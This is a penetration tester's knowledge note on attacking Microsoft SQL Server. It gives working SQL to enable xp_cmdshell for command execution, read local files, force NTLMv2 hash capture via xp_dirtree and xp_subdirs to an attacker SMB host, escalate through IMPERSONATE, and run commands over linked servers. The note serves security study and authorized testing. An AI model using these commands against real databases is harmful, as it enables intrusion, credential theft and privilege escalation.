---
type: knowledge
category: protocols
tags:
  - knowledge/protocol
aliases:
  - mssql, sqlserver, 1433
---
# MSSQL (Microsoft Structured Query Language)

**Default Ports:** `1433` (TCP - Standard MSSQL Instance)  |  `1434` (UDP - SQL Server Browser Service)  
**Description:** A relational database management system from Microsoft. It is extremely relevant in Windows environments and Active Directory, as SQL services often run under privileged service accounts and serve as an entry point for RCE or domain escalation.

---

## 01 - Enumeration


### 1.1 - Quick Check / Banner Grabbing

### 1.2 - Deep Enumeration

## 02 - Connecting to Service
### 2.1 - Establishing connection:
### Windows User
![[Scripts#^d1d004]]

#### Local MSSQL-User
![[Scripts#^36c4b9]]

### 2.2 - MSSQL command sequence after establishing a connection:
#### 2.2.1 - CLI
1. List DBs:
```sql
select name from sys.databases
```

2. Select DB:
```sql
use DB-Name;
```

3. List tables:
```sql
select name from sys.tables;
```

4. Outputs all contents of specified table:
```sql
SELECT * FROM <Tablename>;
```

5. Search for "keywords" inside table:

#### 2.2.2 - GUI
##### Query Database Object via GUI:
1. Open a new query window (New Query).
2. Run the following query: SELECT * FROM dbo.OBJECTNAME;
3. In the Results pane, right-click the empty gray cell in the upper-left corner (where the column and row headers intersect).
4. Select Save Results As... and save the results directly as a .csv file.
---

## Weaknesses
### XP_cmdshell
`MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:

- `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
- `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed

`xp_cmdshell` can be used like this:
```sql
EXEC xp_cmdshell 'whoami'
```


If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:

```sql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

### Read local files
By default, `MSSQL` allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

### Capture MSSQL Service Hash
We can also steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.

To make this work, we first need to start [Responder](https://github.com/lgandx/Responder) or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) and execute one of the following SQL queries:
#### XP_DIRTREE Hash Stealing
```sql
EXEC master..xp_dirtree '\\10.10.110.17\share\'
```
#### XP_SUBDIRS Hash Stealing
```sql
EXEC master..xp_subdirs '\\10.10.110.17\share\'
```
If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.

### Impersonate Existing Users with MSSQL
SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Let's explore how the `IMPERSONATE` privilege can lead to privilege escalation in SQL Server.

First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:
#### Identify Users that We Can Impersonate
```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```
#### Verifying our Current User and Role
Check if current role is `sysadmin`, `securityadmin` or  `dbcreator` :
```sql
SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin'), IS_SRVROLEMEMBER('securityadmin'), IS_SRVROLEMEMBER('dbcreator');
```
#### Impersonating an User
To impersonate a user, we can use the Transact-SQL statement `EXECUTE AS LOGIN` and set it to the user we want to impersonate.
```sql
EXECUTE AS LOGIN = 'USER' 
```

> [!INFO] Note
It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database.

revert the operation and return to our previous user, we can use the Transact-SQL statement `REVERT`.

### Communicate with Other Databases with MSSQL
`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.
#### Identify linked Servers in MSSQL
```sql
SELECT srvname, isremote FROM sysservers
```

#### Identify the user used for the connection
We can attempt to identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).
```sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
```
 
If the user can't be identified, we can check with the `impersonated users` if they have a mapping to the `linked DB`:
```sql
SELECT * FROM OPENQUERY([LOCAL.TEST.LINKED.SRV], 'SELECT @@servername');
```

#### Check the role of "linked DB User"
When we have an user who has access to the linked DB, we can check if he has e.g. admin privileges:
```sql
SELECT * FROM OPENQUERY([LOCAL.TEST.LINKED.SRV], 'SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')');
```
If the user has admin rights, it is likely, that he can execute commands via`xp_cmdshell`: [[MSSQL#XP_cmdshell]]

#### Executing commands on linked DB
If we have `sysadmin` privileges and `xp_cmdshell` is configured, chances are, that we are able to execute commands directly on the system:
```sql
EXECUTE AS LOGIN = 'john'; EXEC('EXEC xp_cmdshell ''dir'';') AT [LOCAL.TEST.LINKED.SRV]; REVERT;
```

If `xp_cmdshell` isn't configured yet, we can configure it "remotely" like this and also check our privileges on the remote system:
```sql
EXECUTE AS LOGIN = 'john'; EXEC('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE; EXEC xp_cmdshell ''whoami'';') AT [LOCAL.TEST.LINKED.SRV]; REVERT;
```